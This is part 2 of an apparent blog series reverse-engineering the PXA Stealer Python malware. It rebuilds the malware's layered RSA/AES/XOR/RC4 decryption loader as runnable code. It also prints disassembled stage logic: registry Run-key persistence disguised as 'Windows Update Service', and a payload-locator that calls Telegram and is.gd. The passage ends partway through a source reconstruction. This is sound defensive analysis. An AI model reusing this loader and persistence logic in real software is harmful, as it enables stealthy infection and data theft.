      <div class="min-w-0 min-h-0 max-w-fit">
        
  <details
    class="mt-2 mb-5 overflow-hidden rounded-lg ms-0 ps-5"
    >
    
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 -ms-5 ps-5 dark:bg-primary-800 dark:text-neutral-100">
    PXA Stealer -
    This article is part of a series.
  </summary>
  
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part1/">
          Part 1:
          PXA Stealers Evolution to PureRAT: Part 1 - Basics of Python Reversing &amp; Static Analysis (Stage 1 &amp; 2)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        Part 2:
        This Article
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part3/">
          Part 3:
          PXA Stealers Evolution to PureRAT: Part 3 - Weaponised Python Stage (Stage 5)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part4/">
          Part 4:
          PXA Stealers Evolution to PureRAT: Part 4 - .NET Payload Analysis (Stage 6 &amp; 7)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part5/">
          Part 5:
          PXA Stealers Evolution to PureRAT: Part 5 - Another Shift in Tactics (Stage 8)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part6/">
          Part 6:
          PXA Stealers Evolution to PureRAT: Part 6 - Finally, the Final Stage PureRAT (Stage 9)
        </a>
      </div>
    
  


  </details>


        <div class="article-content max-w-prose mb-20">
          
<h2 class="relative group">Introduction
    <div id="introduction" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#introduction" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>In this section, we shift from traditional file-based malware to payloads that operate entirely in memory. We&rsquo;ll explore how the malware decrypts its internal components, loads Python bytecode dynamically, and uses custom cryptographic loaders to evade detection.</p>
<p>This stage marks a significant escalation in sophistication moving beyond simple obfuscation into multi-layered, in-memory execution chains that are harder to detect, analyse, and contain.</p>
<hr>

<h3 class="relative group">Decoding Stage Three: Base85 Bytecode
    <div id="decoding-stage-three-base85-bytecode" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#decoding-stage-three-base85-bytecode" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>We left off after discovering a <code>base85</code>-encoded string, which appears to be our next stage in the malware’s execution chain.</p>
<p>Normally, I’d decode this using <strong>CyberChef</strong>, but in this case, it doesn&rsquo;t support the <strong>custom Base85 alphabet</strong> used by the malware. (We won’t dive too deep here, but if you inspect the <code>base64.py</code> file bundled with the malware, you’ll see it uses a custom alphabet.)</p>
<p>Instead of decoding it manually, we’ll let the malware do the work <strong>by modifying the original command</strong> like so:</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">dis</span>
</span></span><span class="line"><span class="cl"><span class="n">dis</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;marshal&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;zlib&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">b85decode</span><span class="p">(</span><span class="s2">&#34;c$|ee*&gt;&gt;VcmVoh+&amp;b9W+s_L$Gdue00b.....&#34;</span><span class="p">))))</span></span></span></code></pre></div></div>
<p>We’ve made two key changes:</p>
<ul>
<li>Redirected from <code>exec</code> to Python’s built-in <code>dis</code> module to <strong>disassemble the bytecode</strong>.</li>
<li>Swapped out <code>marshal.loads()</code> for <code>marshal.dumps()</code> to keep the bytecode in a state <code>dis</code> can process.</li>
</ul>
<p>Result: Disassembled Bytecode for Stage 3</p>
<p><figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="low"
    alt="image"
    src="/pictures/pxa/SCR-20250705-tdcb.png"
    ></figure>
</p>
<p>If you&rsquo;ve used tools like <code>Ghidra</code> or <code>IDA</code> , this output might feel familiar, it&rsquo;s Python&rsquo;s equivalent of assembly. While it&rsquo;s often possible to <strong>decompile</strong> Python bytecode back into readable source (with the right magic bytes), I couldn’t get it to work in this case. So instead, we’ll be working directly with this lower-level &ldquo;assembly-style&rdquo; output.</p>
<p>As we go through the disassembled output, we can note a few <strong>important strings and operations</strong>, such as:</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">126 LOAD_CONST               3 ((&#39;b64decode&#39;,))
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">178 LOAD_CONST               7 ((&#39;AES&#39;, &#39;DES3&#39;, &#39;PKCS1_OAEP&#39;))
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">198 LOAD_CONST               8 ((&#39;RSA&#39;,))
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">280 LOAD_CONST              15 (&#39;decompress&#39;)
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">288 LOAD_CONST              17 (&#39;rc4&#39;)
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">296 LOAD_CONST              19 (&#39;aes_decrypt&#39;)
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">304 LOAD_CONST              21 (&#39;xor&#39;)
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">328 LOAD_METHOD             16 (b64decode)
</span></span><span class="line"><span class="cl">330 LOAD_CONST              26 (&#39;LS0tLS1CRUdJTiBSU0EgUFJ.....
</span></span><span class="line"><span class="cl">334 STORE_NAME              49 (private_key)
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">344 LOAD_NAME               48 (hybrid_decrypt)
</span></span><span class="line"><span class="cl">346 LOAD_CONST              29 (&#39;c$@+K1OoexoWdBsm1!pkF&gt;7T}ij
</span></span><span class="line"><span class="cl">348 LOAD_NAME               49 (private_key)
</span></span><span class="line"><span class="cl">352 STORE_NAME              51 (code)
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">354 LOAD_NAME               50 (runner)
</span></span><span class="line"><span class="cl">356 LOAD_NAME               51 (code)</span></span></code></pre></div></div>
<p>This isn&rsquo;t the full disassembly just enough to give you a snapshot of how we step through bytecode to figure out what the malware is doing.</p>
<p>In this case, we can clearly see it importing several <strong>encoding and encryption</strong> functions, including:</p>
<ul>
<li><code>b64decode</code></li>
<li><code>AES</code></li>
<li><code>RSA</code></li>
<li><code>decompress</code></li>
<li><code>rc4</code></li>
<li><code>XOR</code></li>
</ul>
<p>Following that, there&rsquo;s a long <strong>Base64-encoded string</strong> assigned to a variable named <code>private_key</code>. This is passed into a function called <code>hybrid_decrypt</code>, alongside an encrypted string which is saved as <code>code</code>.</p>
<p>Finally, the decrypted <code>code</code> is passed into a function named <code>runner</code>, which as the name suggests <strong>executes</strong> it.</p>
<p><strong>Bingo, we’ve found Stage 4.</strong></p>
<hr>

<h3 class="relative group">Decrypting Stage 4
    <div id="decrypting-stage-4" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#decrypting-stage-4" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>This is where things get messy.</p>
<blockquote><p><strong>Note:</strong> This would’ve been much easier if we were able to <strong>decompile</strong> the bytecode having the original source would have allowed for quick copy-pasting of the decryption functions.</p>
</blockquote><p>Instead, we’re forced to <strong>reconstruct the source code manually</strong> by reading through and rebuilding the original decryption logic from the disassembled bytecode.</p>
<p>Below is the disassembly of the <code>hybrid_decrypt</code> function extracted from the bytecode:</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Disassembly of &lt;code object hybrid_decrypt at 0x0000024C48E6B9F0, file &#34;&lt;string&gt;&#34;, line 42&gt;:
</span></span><span class="line"><span class="cl">44           0 LOAD_GLOBAL              0 (base64)
</span></span><span class="line"><span class="cl">	  2 LOAD_METHOD              1 (b85decode)
</span></span><span class="line"><span class="cl">	  4 LOAD_FAST                0 (base85_encoded_data)
</span></span><span class="line"><span class="cl">	  6 CALL_METHOD              1
</span></span><span class="line"><span class="cl">	  8 STORE_FAST               2 (compressed_data)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">45          10 LOAD_GLOBAL              2 (decompress)
</span></span><span class="line"><span class="cl">	 12 LOAD_FAST                2 (compressed_data)
</span></span><span class="line"><span class="cl">	 14 CALL_FUNCTION            1
</span></span><span class="line"><span class="cl">	 16 STORE_FAST               3 (encrypted_data)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">47          18 LOAD_FAST                3 (encrypted_data)
</span></span><span class="line"><span class="cl">	 20 LOAD_CONST               0 (None)
</span></span><span class="line"><span class="cl">	 22 LOAD_CONST               1 (256)
</span></span><span class="line"><span class="cl">	 24 BUILD_SLICE              2
</span></span><span class="line"><span class="cl">	 26 BINARY_SUBSCR
</span></span><span class="line"><span class="cl">	 28 STORE_FAST               4 (rsa_encrypted_key)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">48          30 LOAD_FAST                3 (encrypted_data)
</span></span><span class="line"><span class="cl">	 32 LOAD_CONST               1 (256)
</span></span><span class="line"><span class="cl">	 34 LOAD_CONST               0 (None)
</span></span><span class="line"><span class="cl">	 36 BUILD_SLICE              2
</span></span><span class="line"><span class="cl">	 38 BINARY_SUBSCR
</span></span><span class="line"><span class="cl">	 40 STORE_FAST               5 (aes_encrypted)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">51          42 LOAD_GLOBAL              3 (rsa_decrypt)
</span></span><span class="line"><span class="cl">	 44 LOAD_FAST                4 (rsa_encrypted_key)
</span></span><span class="line"><span class="cl">	 46 LOAD_FAST                1 (rsa_private_key)
</span></span><span class="line"><span class="cl">	 48 CALL_FUNCTION            2
</span></span><span class="line"><span class="cl">	 50 STORE_FAST               6 (combined_key)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">52          52 LOAD_FAST                6 (combined_key)
</span></span><span class="line"><span class="cl">	 54 LOAD_CONST               0 (None)
</span></span><span class="line"><span class="cl">	 56 LOAD_CONST               2 (16)
</span></span><span class="line"><span class="cl">	 58 BUILD_SLICE              2
</span></span><span class="line"><span class="cl">	 60 BINARY_SUBSCR
</span></span><span class="line"><span class="cl">	 62 STORE_FAST               7 (rc4_key)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">53          64 LOAD_FAST                6 (combined_key)
</span></span><span class="line"><span class="cl">	 66 LOAD_CONST               2 (16)
</span></span><span class="line"><span class="cl">	 68 LOAD_CONST               3 (32)
</span></span><span class="line"><span class="cl">	 70 BUILD_SLICE              2
</span></span><span class="line"><span class="cl">	 72 BINARY_SUBSCR
</span></span><span class="line"><span class="cl">	 74 STORE_FAST               8 (xor_key)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">54          76 LOAD_FAST                6 (combined_key)
</span></span><span class="line"><span class="cl">	 78 LOAD_CONST               3 (32)
</span></span><span class="line"><span class="cl">	 80 LOAD_CONST               4 (48)
</span></span><span class="line"><span class="cl">	 82 BUILD_SLICE              2
</span></span><span class="line"><span class="cl">	 84 BINARY_SUBSCR
</span></span><span class="line"><span class="cl">	 86 STORE_FAST               9 (aes_key)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">57          88 LOAD_GLOBAL              4 (aes_decrypt)
</span></span><span class="line"><span class="cl">	 90 LOAD_FAST                5 (aes_encrypted)
</span></span><span class="line"><span class="cl">	 92 LOAD_FAST                9 (aes_key)
</span></span><span class="line"><span class="cl">	 94 CALL_FUNCTION            2
</span></span><span class="line"><span class="cl">	 96 STORE_FAST              10 (xor_encrypted)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">60          98 LOAD_GLOBAL              5 (xor)
</span></span><span class="line"><span class="cl">	100 LOAD_FAST               10 (xor_encrypted)
</span></span><span class="line"><span class="cl">	102 LOAD_FAST                8 (xor_key)
</span></span><span class="line"><span class="cl">	104 CALL_FUNCTION            2
</span></span><span class="line"><span class="cl">	106 STORE_FAST              11 (rc4_encrypted)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">63         108 LOAD_GLOBAL              6 (rc4)
</span></span><span class="line"><span class="cl">	110 LOAD_FAST               11 (rc4_encrypted)
</span></span><span class="line"><span class="cl">	112 LOAD_FAST                7 (rc4_key)
</span></span><span class="line"><span class="cl">	114 CALL_FUNCTION            2
</span></span><span class="line"><span class="cl">	116 STORE_FAST              12 (decrypted_data)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">65         118 LOAD_FAST               12 (decrypted_data)
</span></span><span class="line"><span class="cl">	120 RETURN_VALUE</span></span></code></pre></div></div>
<p>Looking closely at the disassembly output, we can see lots of <strong>slicing operations</strong> a indicating that multiple smaller keys have been <strong>combined into one large key</strong>, which is <strong>RSA-encrypted</strong>.</p>
<p>Therefore we need to decrypt the key then <strong>slice it into segments</strong>, with each slice used for a different layer of decryption.</p>
<p>After <strong>a lot</strong> of trial and error, running Python over and over again, we’ve reconstructed a working version of the original <code>hybrid_decrypt</code> function:</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span><span class="p">,</span> <span class="n">PKCS1_OAEP</span><span class="p">,</span> <span class="n">ARC4</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">dis</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">marshal</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">privateKey</span> <span class="o">=</span> <span class="s1">&#39;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tL........&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cipherText</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;c$@+K1OoexoWdBsm1!pkF&gt;7T}ijW92LAjwj?NX;j........&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">cipher</span> <span class="o">=</span> <span class="n">ARC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">aes_decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">nonce</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="n">cipherText2</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">	<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_EAX</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">nonce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipherText2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rsa_decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">rsa_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">rsa_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hybrid_decrypt</span><span class="p">(</span><span class="n">base85_encoded_data</span><span class="p">,</span> <span class="n">rsa_private_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">compressed_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b85decode</span><span class="p">(</span><span class="n">base85_encoded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">compressed_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">rsa_encrypted_key</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="p">[:</span><span class="mi">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="n">aes_encrypted</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="p">[</span><span class="mi">256</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">combined_key</span> <span class="o">=</span> <span class="n">rsa_decrypt</span><span class="p">(</span><span class="n">rsa_encrypted_key</span><span class="p">,</span> <span class="n">rsa_private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">rc4_key</span> <span class="o">=</span> <span class="n">combined_key</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="n">xor_key</span> <span class="o">=</span> <span class="n">combined_key</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="n">aes_key</span> <span class="o">=</span> <span class="n">combined_key</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">xor_encrypted</span> <span class="o">=</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">aes_encrypted</span><span class="p">,</span> <span class="n">aes_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">rc4_encrypted</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">xor_encrypted</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">rc4</span><span class="p">(</span><span class="n">rc4_encrypted</span><span class="p">,</span> <span class="n">rc4_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">decrypted_data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Main</span>
</span></span><span class="line"><span class="cl"><span class="n">private_key_pem</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">privateKey</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">decrypted_payload</span> <span class="o">=</span> <span class="n">hybrid_decrypt</span><span class="p">(</span><span class="n">cipherText</span><span class="p">,</span> <span class="n">private_key_pem</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dis</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">marshal</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">decrypted_payload</span><span class="p">))</span></span></span></code></pre></div></div>
<blockquote><p><strong>Note:</strong><br>
The individual decryption functions (like <code>rsa_decrypt</code>, <code>aes_decrypt</code>, etc.) were <strong>reconstructed from other parts of the disassembly</strong>, which aren&rsquo;t shown above. Just focus on understanding and mapping out the <code>hybrid_decrypt</code> function itself.</p>
</blockquote><p>I could easily write another blog posts just on how that reconstruction was done but for now, the key takeaway is this:</p>
<p>If you <strong>compare the strings and values in the disassembled code</strong> with the ones used in the reconstructed Python function, you&rsquo;ll notice they <strong>match up directly</strong>. This is how we were able to rebuild the logic behind <code>hybrid_decrypt</code>.</p>
<hr>

<h3 class="relative group">Analysing Stage 4
    <div id="analysing-stage-4" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#analysing-stage-4" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>Running the fully reconstructed <code>hybrid_decrypt</code> function <strong>outputs a large block of disassembled bytecode</strong> this marks the beginning of <strong>Stage 5</strong>.</p>
<p>Following the same approach as earlier, I&rsquo;m going to <strong>list out the functions that stand out</strong>.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  4 IMPORT_NAME              0 (requests)
</span></span><span class="line"><span class="cl">  .....
</span></span><span class="line"><span class="cl">  20 IMPORT_NAME              2 (time)
</span></span><span class="line"><span class="cl">  .....
</span></span><span class="line"><span class="cl">  28 IMPORT_NAME              3 (sys)
</span></span><span class="line"><span class="cl">  ....
</span></span><span class="line"><span class="cl">  36 IMPORT_NAME              4 (os)
</span></span><span class="line"><span class="cl">  .....
</span></span><span class="line"><span class="cl">  44 IMPORT_NAME              5 (winreg)
</span></span><span class="line"><span class="cl">  .....
</span></span><span class="line"><span class="cl">  60 LOAD_NAME                4 (os)
</span></span><span class="line"><span class="cl">  62 LOAD_ATTR                7 (path)
</span></span><span class="line"><span class="cl">  64 LOAD_METHOD              8 (exists)
</span></span><span class="line"><span class="cl">  66 LOAD_NAME                4 (os)
</span></span><span class="line"><span class="cl">  68 LOAD_ATTR                9 (environ)
</span></span><span class="line"><span class="cl">  70 LOAD_CONST               3 (&#39;PUBLIC&#39;)
</span></span><span class="line"><span class="cl">  .....
</span></span><span class="line"><span class="cl">  88 LOAD_ATTR                9 (environ)
</span></span><span class="line"><span class="cl">  90 LOAD_CONST               5 (&#39;COMPUTERNAME&#39;)
</span></span><span class="line"><span class="cl">  ......
</span></span><span class="line"><span class="cl">  110 LOAD_NAME                5 (winreg)
</span></span><span class="line"><span class="cl">  112 LOAD_ATTR               14 (HKEY_CURRENT_USER)
</span></span><span class="line"><span class="cl">  114 LOAD_CONST               6 (&#39;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&#39;)
</span></span><span class="line"><span class="cl">  ......
</span></span><span class="line"><span class="cl">  128 LOAD_METHOD             17 (SetValueEx)
</span></span><span class="line"><span class="cl">  130 LOAD_NAME               16 (key)
</span></span><span class="line"><span class="cl">  132 LOAD_CONST               7 (&#39;Windows Update Service&#39;)
</span></span><span class="line"><span class="cl">  .....
</span></span><span class="line"><span class="cl">  140 LOAD_CONST               8 (&#39;cmd /c start &#39;)
</span></span><span class="line"><span class="cl">  ......
</span></span><span class="line"><span class="cl">  154 LOAD_CONST              10 (&#39;\\Windows\\svchost.exe C:\\Users\\Public\\Windows\\Lib\\images.png &#39;)
</span></span><span class="line"><span class="cl">  ......
</span></span><span class="line"><span class="cl">  182 LOAD_NAME                1 (re)
</span></span><span class="line"><span class="cl">  184 LOAD_METHOD             22 (search)
</span></span><span class="line"><span class="cl">  186 LOAD_CONST              12 (&#39;&lt;meta property=&#34;og:description&#34; content=&#34;([^&#34;]+)&#34;&#39;)
</span></span><span class="line"><span class="cl">  188 LOAD_NAME                0 (requests)
</span></span><span class="line"><span class="cl">  190 LOAD_METHOD             23 (get)
</span></span><span class="line"><span class="cl">  192 LOAD_CONST              13 (&#39;https://t.me/&#39;)
</span></span><span class="line"><span class="cl">  194 LOAD_NAME                3 (sys)
</span></span><span class="line"><span class="cl">  196 LOAD_ATTR               20 (argv)
</span></span><span class="line"><span class="cl">  ......
</span></span><span class="line"><span class="cl">  222 LOAD_METHOD             23 (get)
</span></span><span class="line"><span class="cl">  224 LOAD_NAME                0 (requests)
</span></span><span class="line"><span class="cl">  226 LOAD_ATTR               27 (head)
</span></span><span class="line"><span class="cl">  228 LOAD_CONST              14 (&#39;https://is.gd/&#39;)
</span></span><span class="line"><span class="cl">  230 LOAD_NAME               25 (match)
</span></span><span class="line"><span class="cl">  232 LOAD_METHOD             28 (group
</span></span><span class="line"><span class="cl">  234 LOAD_CONST              11 (1)
</span></span><span class="line"><span class="cl">  ......
</span></span><span class="line"><span class="cl">  19         290 LOAD_NAME                2 (time)
</span></span><span class="line"><span class="cl">  292 LOAD_METHOD             33 (sleep)
</span></span><span class="line"><span class="cl">  294 LOAD_CONST              16 (5)</span></span></code></pre></div></div>
<p>Converted to source code, it would have looked something like this.<br>
Hopefully, this version is a bit more understandable for the rest of the discussion:</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">winreg</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Check if a specific file path exists in PUBLIC folder</span>
</span></span><span class="line"><span class="cl">    <span class="n">public_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;PUBLIC&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">computer_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;COMPUTERNAME&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">unique_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">public_path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid5</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">NAMESPACE_DNS</span><span class="p">,</span> <span class="n">computer_name</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
